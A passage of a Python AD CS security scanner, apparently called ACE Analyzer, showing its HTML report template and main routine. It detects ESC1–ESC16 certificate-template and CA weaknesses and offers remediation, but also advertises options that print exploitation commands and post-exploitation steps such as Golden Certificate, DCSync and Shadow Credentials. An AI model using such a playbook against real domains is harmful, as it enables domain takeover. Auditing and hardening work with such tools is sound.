  --bg:#0f1117; --bg2:#1a1d2e; --bg3:#242840; --bg4:#2e3355;
  --border:#3a3f5c; --border2:#4a5070;
  --text:#e0e6ff; --muted:#8892b0; --muted2:#6272a4;
  --crit:#ff4757; --crit-bg:rgba(255,71,87,.15); --crit-border:rgba(255,71,87,.4);
  --high:#ffa502; --high-bg:rgba(255,165,2,.15); --high-border:rgba(255,165,2,.4);
  --med:#eccc68;  --med-bg:rgba(236,204,104,.15); --med-border:rgba(236,204,104,.4);
  --good:#2ed573; --good-bg:rgba(46,213,115,.12);
  --info:#1e90ff; --info-bg:rgba(30,144,255,.15);
  --cyan:#70e1f5; --acc:#a29bfe; --acc2:#6c63ff;
  --purple:#bd93f9;
}}
*{{box-sizing:border-box;margin:0;padding:0;}}
body{{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;line-height:1.6;}}

/* ── Header ── */
header{{background:var(--bg2);padding:22px 32px;border-bottom:2px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;}}
header h1{{font-size:20px;font-weight:700;color:var(--cyan);letter-spacing:-.3px;}}
.meta{{color:var(--muted);font-size:12px;}}
.meta span{{margin:0 6px;color:var(--border2);}}

/* ── Tabs ── */
.tabs{{display:flex;background:var(--bg2);border-bottom:2px solid var(--border);padding:0 24px;gap:4px;}}
.tab-btn{{padding:13px 20px;cursor:pointer;border:none;background:none;color:var(--muted);font-size:13px;font-weight:600;border-bottom:3px solid transparent;transition:all .2s;}}
.tab-btn:hover{{color:var(--text);background:rgba(255,255,255,.03);}}
.tab-btn.active{{color:var(--cyan);border-bottom-color:var(--cyan);}}
.tab{{display:none;padding:32px;max-width:1400px;}}
.tab.active{{display:block;}}

/* ── Stats ── */
.stats{{display:flex;gap:14px;margin-bottom:28px;flex-wrap:wrap;}}
.stat{{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:18px 26px;min-width:148px;transition:border-color .2s;}}
.stat:hover{{border-color:var(--border2);}}
.stat .val{{font-size:32px;font-weight:800;letter-spacing:-1px;}}
.stat .lbl{{color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.08em;margin-top:4px;}}
.stat.c{{border-left:3px solid var(--crit);}} .stat.c .val{{color:var(--crit);}}
.stat.h{{border-left:3px solid var(--high);}} .stat.h .val{{color:var(--high);}}
.stat.i{{border-left:3px solid var(--info);}} .stat.i .val{{color:var(--info);}}
.stat.g{{border-left:3px solid var(--good);}} .stat.g .val{{color:var(--good);}}

/* ── Tables ── */
table{{width:100%;border-collapse:collapse;margin-bottom:24px;border-radius:8px;overflow:hidden;}}
th{{background:var(--bg3);padding:10px 16px;text-align:left;color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.06em;border-bottom:2px solid var(--border);}}
td{{padding:11px 16px;border-bottom:1px solid var(--border);vertical-align:middle;}}
tr:hover td{{background:rgba(255,255,255,.025);}}
.name-cell{{font-weight:500;}}
.ca-badge{{background:var(--info-bg);color:var(--info);border:1px solid rgba(30,144,255,.4);padding:1px 6px;border-radius:3px;font-size:10px;font-weight:700;margin-right:4px;}}

/* ── Badges ── */
.badge{{display:inline-block;padding:3px 9px;border-radius:5px;font-size:11px;font-weight:700;letter-spacing:.03em;}}
.critical{{background:var(--crit-bg);color:var(--crit);border:1px solid var(--crit-border);}}
.high{{background:var(--high-bg);color:var(--high);border:1px solid var(--high-border);}}
.medium{{background:var(--med-bg);color:var(--med);border:1px solid var(--med-border);}}
.det-badge{{background:var(--good-bg);color:var(--good);border:1px solid rgba(46,213,115,.4);}}
.status-enabled{{color:var(--crit);font-weight:700;}}
.status-disabled{{color:var(--muted);}}
.status-ca{{color:var(--info);font-weight:700;}}
.no-vulns{{color:var(--good);text-align:center;padding:24px;font-size:14px;}}

/* ── Section titles ── */
.section-title{{font-size:16px;font-weight:700;color:var(--cyan);margin:32px 0 16px;padding-bottom:8px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;}}
.section-title:first-child{{margin-top:0;}}
.section-title::before{{content:'';display:inline-block;width:3px;height:18px;background:var(--cyan);border-radius:2px;}}

/* ── Remediation cards ── */
.rem-grid{{display:flex;flex-direction:column;gap:12px;}}
.rem-card{{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;}}
.rem-hdr{{display:flex;align-items:center;gap:12px;padding:14px 18px;background:var(--bg3);border-bottom:1px solid var(--border);}}
.rem-title{{font-weight:600;flex:1;}}
.rem-steps{{list-style:none;padding:14px 18px 14px 18px;display:flex;flex-direction:column;gap:8px;}}
.rem-steps li{{padding-left:20px;position:relative;color:var(--muted);}}
.rem-steps li::before{{content:'→';position:absolute;left:0;color:var(--acc);font-weight:700;}}
.rem-steps li code{{background:var(--bg3);padding:1px 5px;border-radius:3px;font-size:12px;color:var(--cyan);}}
.rem-steps li em{{color:var(--text);font-style:normal;font-weight:500;}}
.rem-general{{border-color:var(--acc);}}
.rem-general .rem-hdr{{border-left:3px solid var(--acc);}}
.gen-chip{{background:var(--acc2);color:white;padding:2px 10px;border-radius:4px;font-size:13px;}}
.no-vulns-box{{background:var(--good-bg);border:1px solid rgba(46,213,115,.3);border-radius:8px;padding:20px;text-align:center;color:var(--good);font-size:15px;}}

/* ── ESC accordion cards ── */
.esc-grid{{display:flex;flex-direction:column;gap:10px;}}
.esc-card{{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;transition:border-color .2s;}}
.esc-card:hover{{border-color:var(--border2);}}
.esc-card.det{{border-color:rgba(46,213,115,.35);box-shadow:0 0 0 1px rgba(46,213,115,.1);}}
.esc-card.adv{{border-color:rgba(162,155,254,.3);}}
.esc-hdr{{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;cursor:pointer;list-style:none;background:var(--bg3);user-select:none;gap:12px;}}
.esc-hdr::-webkit-details-marker{{display:none;}}
.esc-hdr:hover{{background:var(--bg4);}}
.esc-left{{display:flex;align-items:center;gap:12px;flex:1;min-width:0;}}
.esc-name{{font-weight:600;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}}
.esc-right{{display:flex;align-items:center;gap:8px;flex-shrink:0;}}
.esc-chip{{padding:3px 10px;border-radius:5px;font-size:12px;font-weight:800;letter-spacing:.05em;white-space:nowrap;}}
.esc-chip.critical{{background:var(--crit-bg);color:var(--crit);border:1px solid var(--crit-border);}}
.esc-chip.high{{background:var(--high-bg);color:var(--high);border:1px solid var(--high-border);}}
.esc-chip.medium{{background:var(--med-bg);color:var(--med);border:1px solid var(--med-border);}}
.adv-chip{{background:rgba(162,155,254,.2);color:var(--acc);border:1px solid rgba(162,155,254,.4);padding:3px 10px;border-radius:5px;font-size:12px;font-weight:800;}}
.chevron{{color:var(--muted);font-size:12px;transition:transform .2s;}}
details[open] .chevron{{transform:rotate(180deg);}}
.esc-body{{padding:20px 22px;display:flex;flex-direction:column;gap:16px;border-top:1px solid var(--border);}}
.esc-desc{{color:var(--muted);line-height:1.7;}}
.info-box{{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:14px 16px;}}
.tpl-box{{border-color:rgba(46,213,115,.25);background:var(--good-bg);}}
.tpl-box .box-lbl{{color:var(--good);}}
.box-lbl{{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--acc);margin-bottom:8px;}}
.info-box ul{{list-style:none;display:flex;flex-direction:column;gap:5px;}}
.info-box li{{padding-left:16px;position:relative;color:var(--muted);font-size:13px;}}
.info-box li::before{{content:'›';position:absolute;left:0;color:var(--acc);font-weight:700;}}
.tpl-box li::before{{color:var(--good);}}

/* ── Command cards ── */
.cmd-card{{background:var(--bg);border:1px solid var(--border);border-radius:8px;overflow:hidden;position:relative;}}
.cmd-lbl{{padding:9px 14px;background:var(--bg3);font-size:12px;font-weight:600;color:var(--acc);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:6px;}}
.cmd-icon{{color:var(--cyan);font-size:11px;}}
.cmd-pre{{padding:16px;font-family:'Cascadia Code','Consolas','Courier New',monospace;font-size:12.5px;line-height:1.7;color:var(--text);white-space:pre-wrap;word-break:break-all;overflow-x:auto;background:var(--bg);}}
.copy-btn{{position:absolute;top:38px;right:10px;background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:4px 10px;border-radius:4px;font-size:11px;cursor:pointer;transition:all .2s;}}
.copy-btn:hover{{background:var(--acc2);color:white;border-color:var(--acc2);}}
.copy-btn.copied{{background:var(--good-bg);color:var(--good);border-color:rgba(46,213,115,.4);}}

/* ── ACL analysis ── */
.acl-block{{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:18px;}}
.acl-block-hdr{{display:flex;align-items:center;gap:12px;padding:13px 18px;background:var(--bg3);border-bottom:1px solid var(--border);}}
.acl-type-badge{{background:rgba(162,155,254,.2);color:var(--acc);border:1px solid rgba(162,155,254,.4);padding:2px 8px;border-radius:4px;font-size:10px;font-weight:800;}}
.acl-name{{font-weight:600;font-size:14px;}}
.acl-block table{{margin:0;border-radius:0;}}
.acl-block th{{background:var(--bg);border-bottom:1px solid var(--border);}}
.principal-cell{{font-weight:500;}}
.sid-code{{font-family:monospace;font-size:10px;color:var(--muted2);background:var(--bg3);padding:1px 5px;border-radius:3px;}}
.rights-cell{{display:flex;gap:4px;flex-wrap:wrap;padding-top:8px;padding-bottom:8px;}}
.right-badge{{background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:2px 7px;border-radius:4px;font-size:11px;white-space:nowrap;}}
.right-danger{{background:var(--high-bg);border-color:var(--high-border);color:var(--high);}}
.right-enroll{{background:var(--crit-bg);border-color:var(--crit-border);color:var(--crit);}}
.row-danger td{{background:rgba(255,71,87,.06);}}
.row-warn td{{background:rgba(255,165,2,.06);}}
.tag-lp{{background:var(--crit-bg);color:var(--crit);border:1px solid var(--crit-border);padding:2px 7px;border-radius:4px;font-size:10px;font-weight:800;margin-right:4px;white-space:nowrap;}}
.tag-enroll{{background:var(--high-bg);color:var(--high);border:1px solid var(--high-border);padding:2px 7px;border-radius:4px;font-size:10px;font-weight:800;white-space:nowrap;}}
.empty-row{{color:var(--muted);text-align:center;font-style:italic;}}
.no-data{{color:var(--muted);padding:20px;text-align:center;}}

/* ── Abuse tab sub-sections ── */
.abuse-section-hdr{{font-size:14px;font-weight:700;color:var(--purple);margin:28px 0 12px;padding:10px 14px;background:rgba(189,147,249,.07);border-left:3px solid var(--purple);border-radius:4px;}}
.abuse-section-hdr:first-child{{margin-top:0;}}

footer{{text-align:center;color:var(--muted2);padding:24px;font-size:12px;border-top:1px solid var(--border);margin-top:48px;}}
</style>
</head>
<body>
<header>
  <h1>&#x1F6E1; ACE Analyzer v4.2 &mdash; AD CS Security Report</h1>
  <div class="meta">
    {timestamp}
    <span>|</span> {h(str(input_file))}
    <span>|</span> {h(format_type)}
  </div>
</header>
<div class="tabs">
  <button class="tab-btn active" onclick="showTab('overview',this)">&#9654; Vulnerability Overview</button>
  <button class="tab-btn" onclick="showTab('abuse',this)">&#9889; Abuse Techniques</button>
  <button class="tab-btn" onclick="showTab('acl',this)">&#9783; ACL Analysis</button>
</div>

<!-- ══════════════════════ OVERVIEW TAB ══════════════════════ -->
<div id="tab-overview" class="tab active">
  <div class="stats">
    <div class="stat c"><div class="val">{n_templates}</div><div class="lbl">Vulnerable Templates</div></div>
    <div class="stat h"><div class="val">{n_cas}</div><div class="lbl">Vulnerable CAs</div></div>
    <div class="stat i"><div class="val">{n_detected}</div><div class="lbl">Unique ESC Types</div></div>
    <div class="stat c"><div class="val">{n_critical}</div><div class="lbl">Critical Findings</div></div>
  </div>

  <div class="section-title">Findings</div>
  <table>
    <thead><tr>
      <th>Name</th><th>Status</th><th>Severity</th>
      <th>ESC(s)</th><th>CA</th><th>Exploitable By</th>
    </tr></thead>
    <tbody>{table_body}</tbody>
  </table>

  <div class="section-title">Remediation Recommendations</div>
  <div class="rem-grid">{rem_cards_html}</div>
</div>

<!-- ══════════════════════ ABUSE TECHNIQUES TAB ══════════════════════ -->
<div id="tab-abuse" class="tab">
  <div class="abuse-section-hdr">ESC Attack Techniques</div>
  <div class="esc-grid">{esc_cards_html}</div>

  <div class="abuse-section-hdr" style="margin-top:36px;">Advanced Post-Exploitation</div>
  <div class="esc-grid">{adv_cards_html}</div>
</div>

<!-- ══════════════════════ ACL ANALYSIS TAB ══════════════════════ -->
<div id="tab-acl" class="tab">
  {acl_content}
</div>

<footer>ACE Analyzer v4.2 &mdash; AD CS ESC1&ndash;ESC16 Scanner &mdash; Generated {timestamp}</footer>

<script>
function showTab(name, btn) {{
  document.querySelectorAll('.tab').forEach(e => e.classList.remove('active'));
  document.querySelectorAll('.tab-btn').forEach(e => e.classList.remove('active'));
  document.getElementById('tab-' + name).classList.add('active');
  btn.classList.add('active');
}}
function cpCmd(btn) {{
  const pre = btn.previousElementSibling;
  navigator.clipboard.writeText(pre.innerText).then(() => {{
    btn.classList.add('copied');
    btn.textContent = '✓ Copied';
    setTimeout(() => {{ btn.classList.remove('copied'); btn.innerHTML = '&#10697; Copy'; }}, 2000);
  }}).catch(() => {{
    const r = document.createRange();
    r.selectNode(pre);
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(r);
  }});
}}
</script>
</body>
</html>"""

    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        print(f"[*] HTML report written to: {filename}")
    except Exception as e:
        print(f"[!] Warning: Could not write HTML report: {e}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description='Analyze AD CS certificate template ACLs for ESC1-ESC16 vulnerabilities',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Supported input formats (auto-detected):
  BloodHound JSON      - ADExplorerSnapshot.py -m BloodHound output
  Certipy JSON         - certipy find -json  (v4.x string flags and v5.x integer flags)
  Certify plaintext    - Certify.exe find [/vulnerable]
  Certify 2.0 text     - Certify.exe enum-cas / enum-templates
  Raw ACE Array        - PowerShell nTSecurityDescriptor export
  NDJSON               - ADExplorerSnapshot.py -m Objects (limited support)

Detects:
  ESC1  - Subject Alternative Name specification (enrollee supplies subject)
  ESC2  - Any Purpose EKU abuse
  ESC3  - Certificate Request Agent EKU abuse
  ESC4  - Vulnerable template access control (low-priv can modify template)
  ESC5  - Vulnerable PKI object ACL (informational note, partial detection)
  ESC6  - EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
  ESC7  - Vulnerable CA access control (ManageCA/ManageCertificates for low-priv)
  ESC8  - NTLM relay to web enrollment (configuration warning)
  ESC9  - CT_FLAG_NO_SECURITY_EXTENSION on template (no SID in certificate)
  ESC10 - Weak certificate mapping on DCs (StrongCertificateBindingEnforcement<2)
  ESC11 - CA RPC without packet encryption (NTLM relay to MS-ICPR)
  ESC12 - TPM attestation bypass (informational note)
  ESC13 - Issuance Policy OID linked to AD group (OID group link abuse)
  ESC15 - Schema v1 template with arbitrary EKU in CSR (CVE-2024-49019/EKUwu)
  ESC16 - CA-level SID security extension disabled (CA-wide ESC9)

Examples:
  %(prog)s certipy_output.json
  %(prog)s bloodhound_certtemplates.json
  %(prog)s aces.json -o report.log
  %(prog)s --show-all bloodhound_output.json -q
  %(prog)s --attack-path ESC1 certipy_output.json
  %(prog)s --attack-path ESC5                          (standalone info, no file needed)
  %(prog)s --remediation certipy_output.json
  %(prog)s --html report.html certipy_output.json
  %(prog)s --attack-path ALL --html report.html --remediation scan.json
        '''
    )

    parser.add_argument('file', nargs='?', default=None,
                        help='JSON/NDJSON/plaintext file to scan '
                             '(omit when using --attack-path standalone)')
    parser.add_argument('-q', '--quiet',
                        action='store_true',
                        help='Suppress ACL detail, show only vulnerability findings')
    parser.add_argument('--show-all',
                        action='store_true',
                        help='Show all templates including secure ones')
    parser.add_argument('-o', '--output',
                        default='ace_analyzer_output.log',
                        help='Output log file (default: ace_analyzer_output.log)')
    parser.add_argument('--attack-path', '-ap', metavar='ESC',
                        help='Show exploitation commands for a specific ESC '
                             '(e.g. ESC1, ESC4, ESC15 — or ALL for every detected ESC). '
                             'Can be used without a scan file.')
    parser.add_argument('--show-advanced', action='store_true',
                        help='Show advanced post-exploitation: Golden Certificate, '
                             'DCSync via Pass-the-Certificate, Schannel LDAP shell, '
                             'Shadow Credentials.')
    parser.add_argument('--remediation', action='store_true',
                        help='Show consolidated remediation guidance for all detected vulnerabilities')
    parser.add_argument('--html', metavar='FILE',
                        help='Generate a self-contained HTML report with vulnerability overview, '
                             'abuse techniques, and full ACL analysis (e.g. report.html)')

    args = parser.parse_args()

    # ------------------------------------------------------------------ #
    #  Standalone --attack-path mode (no scan file required)              #
    # ------------------------------------------------------------------ #
    if args.attack_path and not args.file:
        esc_input = args.attack_path.upper()
        if esc_input == 'ALL':
            esc_list = list(VALID_ATTACK_PATHS)
        else:
            esc_list = [e.strip().upper() for e in esc_input.replace(',', ' ').split()]
            unknown = [e for e in esc_list if e not in VALID_ATTACK_PATHS]
            if unknown:
                print(f"[!] Unknown ESC identifier(s): {', '.join(unknown)}")
                print(f"    Valid values: {', '.join(VALID_ATTACK_PATHS)}")
                sys.exit(1)

        buf = []
        print_attack_path(esc_list, '<CA>', '<CA-HOST>', '<DOMAIN>', [], buf)
        print_colored_output(buf)
        sys.exit(0)

    # Require a file for all other modes
    if not args.file:
        parser.print_help()
        sys.exit(1)

    output_buffer = []

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    output_buffer.append("=" * 70)
    output_buffer.append("ACE Analyzer v4.1 - ESC1-ESC16 Analysis Report")
    output_buffer.append(f"Generated: {timestamp}")
    output_buffer.append(f"Input File: {args.file}")
    output_buffer.append("=" * 70)
    output_buffer.append("")

    print(f"\n[*] Loading data from: {args.file}")
    templates, cas, format_type = load_data_from_file(args.file)

    if format_type == 'ndjson':
        print("[!] NDJSON format requires conversion first. See --help for details.")
        sys.exit(1)

    if format_type in ('bloodhound', 'certipy', 'certify'):
        print(f"[*] Found {len(templates)} certificate template(s) and {len(cas)} CA(s)")
        print()

        output_buffer.append(f"[*] Found {len(templates)} template(s) and {len(cas)} CA(s)")
        output_buffer.append(f"[*] Input format: {format_type}")
        output_buffer.append("")

        all_vulnerabilities = []
        items_to_show = []
        acl_data = []

        # Evaluate templates for vulnerabilities
        for template in templates:
            template_name = template.get('name', 'Unknown')

            raw_aces = template.get('aces', [])
            if not raw_aces:
                output_buffer.append(f"[!] No ACE data for template '{template_name}' - skipping")
                continue

            # BloodHound ACEs need parsing; Certipy/Certify/pre-parsed ACEs are already structured
            if format_type == 'bloodhound':
                aces_data = [parse_bloodhound_ace(ace) for ace in raw_aces]
            else:
                aces_data = raw_aces

            principals, domain_sid_base = analyze_aces(aces_data)
            if not principals:
                continue

            acl_data.append({
                'name': template_name,
                'type': 'template',
                'principals': principals,
                'domain_sid': domain_sid_base,
            })

            tprops = template.get('properties', {})

            vuln_flags = [
                check_esc1(tprops, principals, domain_sid_base)[0],
                check_esc2(tprops, principals, domain_sid_base)[0],
                check_esc3(tprops, principals, domain_sid_base)[0],
                check_esc4(principals, domain_sid_base, format_type)[0],
                check_esc9(tprops, principals, domain_sid_base)[0],
                check_esc13(tprops, principals, domain_sid_base)[0],
                check_esc15(tprops, principals, domain_sid_base)[0],
            ]
            has_vuln = any(vuln_flags)

            if has_vuln or args.show_all:
                items_to_show.append({
                    'template': template,
                    'aces': aces_data,
                    'principals': principals,
                    'domain_sid': domain_sid_base,
                })

        # Print template results
        # vuln_records collects per-template data for the attack playbook
        vuln_records = []

        for idx, item in enumerate(items_to_show):
            if idx > 0:
                output_buffer.append("")
            print_template_header(item['template'], output_buffer)
            if not args.quiet:
                print_analysis(item['principals'], item['domain_sid'], output_buffer)
            vulns = assess_security(
                item['principals'], item['domain_sid'],
                item['template'].get('properties'), output_buffer,
                format_type=format_type,
            )
            all_vulnerabilities.extend(vulns)

            if vulns:
                tprops = item['template'].get('properties', {})
                # Best-effort domain/CA extraction from principal names
                domain_guess = '<DOMAIN>'
                for sid in item['principals']:
                    if '\\' in sid and not sid.startswith('S-') and not sid.startswith('__'):
                        nb = sid.split('\\', 1)[0]
                        if '.' in nb:
                            domain_guess = nb.lower()
                        break

                # Low-priv exploitable principal (first one found)
                exploitable_by = ''
                for sid, info in item['principals'].items():
                    friendly = get_friendly_name(sid)
                    if is_low_priv_principal(friendly) and _has_enrollment_right(info['rights']):
                        exploitable_by = _clean_principal_name(friendly)
                        break

                vuln_records.append({
                    'name':         item['template'].get('name', 'Unknown'),
                    'enabled':      tprops.get('enabled', True),
                    'escs':         vulns,
                    'ca_name':      item['template'].get('properties', {}).get(
                                        'certificateauthorities', [''])[0]
                                    if isinstance(item['template'].get('properties', {}).get(
                                        'certificateauthorities'), list)
                                    else '<CA>',
                    'ca_host':      '<CA-HOST>',
                    'domain':       domain_guess,
                    'exploitable_by': exploitable_by,
                })

        # Analyze CAs
        ca_vuln_records = []

        for ca in cas:
            raw_aces = ca.get('aces', [])
            if not raw_aces:
                continue

            if format_type == 'bloodhound':
                aces_data = [parse_bloodhound_ace(ace) for ace in raw_aces]
            else:
                aces_data = raw_aces  # certipy/certify: already in standard ACE format

            ca_principals, domain_sid_base = analyze_aces(aces_data)
            if not ca_principals and not ca.get('properties'):
                continue

            if ca_principals:
                acl_data.append({
                    'name': ca.get('name', 'Unknown'),
                    'type': 'ca',
                    'principals': ca_principals,
                    'domain_sid': domain_sid_base,
                })

            output_buffer.append("")
            output_buffer.append("=" * 70)
            output_buffer.append(f"Certificate Authority: {ca.get('name', 'Unknown')}")
            output_buffer.append("=" * 70)
            output_buffer.append("")

            if not args.quiet and ca_principals:
                print_analysis(ca_principals, domain_sid_base, output_buffer)

            ca_vulns = assess_ca_security(
                ca_principals, domain_sid_base,
                ca.get('properties'), output_buffer,
            )
            all_vulnerabilities.extend(ca_vulns)

            if ca_vulns:
                ca_props = ca.get('properties', {})
                ca_vuln_records.append({
                    'ca_name':  ca.get('name', '<CA>'),
                    'ca_host':  ca_props.get('dnsname', ca_props.get('DNS Name', '<CA-HOST>')),
                    'domain':   '<DOMAIN>',
                    'escs':     ca_vulns,
                    'ca_props': ca_props,
                })

        # Propagate CA name/host into template records where missing
        if ca_vuln_records or cas:
            best_ca   = cas[0].get('name', '<CA>') if cas else '<CA>'
            best_host = (
                cas[0].get('properties', {}).get('dnsname',
                cas[0].get('properties', {}).get('DNS Name', '<CA-HOST>'))
                if cas else '<CA-HOST>'
            )
            for r in vuln_records:
                if r['ca_name'] in ('<CA>', '', None):
                    r['ca_name'] = best_ca
                if r['ca_host'] == '<CA-HOST>':
                    r['ca_host'] = best_host

        # Summary
        output_buffer.append("")
        output_buffer.append("=" * 70)
        if items_to_show or cas:
            unique_vulns = sorted(set(all_vulnerabilities))
            output_buffer.append(
                f"SUMMARY: Analyzed {len(templates)} template(s) and {len(cas)} CA(s)"
            )
            if items_to_show:
                output_buffer.append(
                    f"         {len(items_to_show)} template(s) have findings"
                )
            if unique_vulns:
                output_buffer.append(f"         Vulnerabilities found: {', '.join(unique_vulns)}")
            else:
                output_buffer.append("         No vulnerabilities found")
        else:
            output_buffer.append("[*] No templates or CAs with concerning permissions found")
        output_buffer.append("=" * 70)

        # Extract best CA name / host / domain for the playbook
        best_ca   = ca_vuln_records[0]['ca_name'] if ca_vuln_records else (
                    cas[0].get('name', '<CA>') if cas else '<CA>')
        best_host = ca_vuln_records[0].get('ca_host', '') if ca_vuln_records else (
                    cas[0].get('properties', {}).get('dnsname',
                    cas[0].get('properties', {}).get('DNS Name', '<CA-HOST>'))
                    if cas else '<CA-HOST>')
        best_domain = next(
            (r['domain'] for r in vuln_records if r.get('domain', '<DOMAIN>') != '<DOMAIN>'),
            '<DOMAIN>'
        )
        if not best_host:
            best_host = '<CA-HOST>'

        # Always show the attack-vectors overview table
        print_attack_table(vuln_records, ca_vuln_records, output_buffer)

        # --attack-path: show exploitation commands for specified ESC(s)
        if args.attack_path:
            esc_input = args.attack_path.upper()
            if esc_input == 'ALL':
                # Show only ESCs actually found in this scan
                detected = sorted(set(all_vulnerabilities))
                esc_list = [e for e in VALID_ATTACK_PATHS if e in detected]
            else:
                esc_list = [e.strip().upper() for e in esc_input.replace(',', ' ').split()]
            print_attack_path(esc_list, best_ca, best_host, best_domain,
                              vuln_records, output_buffer)

        # --show-advanced: Golden Cert, DCSync, Schannel, Shadow Creds
        if args.show_advanced:
            print_advanced_attacks(best_ca, best_host, best_domain, output_buffer)

        # --remediation: consolidated fix guidance for all detected vulnerabilities
        if args.remediation:
            print_remediation(all_vulnerabilities, output_buffer)

        write_output_file(args.output, output_buffer)
        print_colored_output(output_buffer)
        print(f"\n[*] Analysis complete. Results written to: {args.output}")

        # --html: generate HTML report (runs after all data is collected)
        if args.html:
            generate_html_report(
                args.html, vuln_records, ca_vuln_records, acl_data,
                all_vulnerabilities, best_ca, best_host, best_domain,
                format_type, args.file,
            )

        critical_vulns = {"ESC1", "ESC2", "ESC3", "ESC4", "ESC6", "ESC7", "ESC15"}
        if any(v in all_vulnerabilities for v in critical_vulns):
            sys.exit(2)
        elif all_vulnerabilities:
            sys.exit(1)
        else:
            sys.exit(0)

    else:
        # Raw ACE list
        print(f"[*] Found {len(templates)} ACE entries (raw format)")
        print()

        output_buffer.append(f"[*] Found {len(templates)} ACE entries")
        output_buffer.append("[*] Input format: raw")
        output_buffer.append("")

        principals, domain_sid_base = analyze_aces(templates)

        if not principals:
            print("Error: No valid ACE data found in file")
            sys.exit(1)

        if not args.quiet:
            print_analysis(principals, domain_sid_base, output_buffer)

        vulnerabilities = assess_security(
            principals, domain_sid_base, None, output_buffer, format_type='raw'
        )

        write_output_file(args.output, output_buffer)
        print_colored_output(output_buffer)
        print(f"\n[*] Analysis complete. Results written to: {args.output}")

        critical_vulns = {"ESC1", "ESC2", "ESC3", "ESC4", "ESC15"}
        if any(v in vulnerabilities for v in critical_vulns):
            sys.exit(2)
        elif vulnerabilities:
            sys.exit(1)
        else:
            sys.exit(0)


if __name__ == "__main__":
    main()
